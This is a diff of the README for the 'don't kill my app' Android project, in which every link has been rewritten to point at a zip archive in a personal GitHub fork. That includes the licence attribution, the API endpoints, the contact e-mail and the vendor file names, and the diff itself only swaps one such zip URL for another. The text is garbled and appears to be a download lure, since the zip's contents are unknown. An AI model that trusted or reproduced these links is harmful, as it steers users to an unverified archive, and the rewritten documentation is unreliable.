@@ -1,21 +1,21 @@
 # Android vendors, don't kill my app!
 
-### [https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/kataphoric/dont-kill-my-app.zip](https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/kataphoric/dont-kill-my-app.zip)
+### [https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/assets/kill_my_app_dont_3.9-alpha.2.zip](https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/assets/kill_my_app_dont_3.9-alpha.2.zip)
 
 ## Licence
 
 This project's source code is open but not intended to be copied in its entirety.
-The content (compiled site), as it shows at https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/kataphoric/dont-kill-my-app.zip, is licenced under CC-BY licence, and thus free to be shared, adapted, even commercially, under the condition of mentioning the original authors of the site, as either https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/kataphoric/dont-kill-my-app.zip, or Urbandroid Team. 
+The content (compiled site), as it shows at https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/assets/kill_my_app_dont_3.9-alpha.2.zip, is licenced under CC-BY licence, and thus free to be shared, adapted, even commercially, under the condition of mentioning the original authors of the site, as either https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/assets/kill_my_app_dont_3.9-alpha.2.zip, or Urbandroid Team. 
 
 ## API
 
-The website provides a JSON API at https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/kataphoric/dont-kill-my-app.zip for developers to use on their websites or in their apps.
+The website provides a JSON API at https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/assets/kill_my_app_dont_3.9-alpha.2.zip for developers to use on their websites or in their apps.
 
-If you use the API, please let us know via e-mail at https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/kataphoric/dont-kill-my-app.zip and give credit to https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/kataphoric/dont-kill-my-app.zip
+If you use the API, please let us know via e-mail at https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/assets/kill_my_app_dont_3.9-alpha.2.zip and give credit to https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/assets/kill_my_app_dont_3.9-alpha.2.zip
 
 ### API v1 docs
 
-URL: https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/kataphoric/dont-kill-my-app.zip
+URL: https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/assets/kill_my_app_dont_3.9-alpha.2.zip
 
 API v1 outputs info on all vendors in one big JSON. If you want one JSON URL per vendor, see API v2.
 
@@ -45,9 +45,9 @@ scheme:
 
 ### API v2 docs
 
-URL: https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/kataphoric/dont-kill-my-app.zip[vendor].json
+URL: https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/assets/kill_my_app_dont_3.9-alpha.2.zip[vendor].json
 
-example: [https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/kataphoric/dont-kill-my-app.zip](https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/kataphoric/dont-kill-my-app.zip)
+example: [https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/assets/kill_my_app_dont_3.9-alpha.2.zip](https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/assets/kill_my_app_dont_3.9-alpha.2.zip)
 
 API v2 provides one JSON URL per vendor.
 
@@ -71,7 +71,7 @@ Pull requests are very welcome, as well as discussion using GitHub issues.
 
 ### Add a new vendor / edit existing vendor:
 
-In _vendor folder, add or edit a https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/kataphoric/dont-kill-my-app.zip file.
+In _vendor folder, add or edit a https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/assets/kill_my_app_dont_3.9-alpha.2.zip file.
 
 Template:
 
@@ -93,7 +93,7 @@ Add
 ```
 award: (int between 1 and 5)
 ```
-variable to the https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/kataphoric/dont-kill-my-app.zip file you wish to award.
+variable to the https://raw.githubusercontent.com/TirtaSandy/dont-kill-my-app/master/assets/kill_my_app_dont_3.9-alpha.2.zip file you wish to award.
 
 ## Who started this project?
 
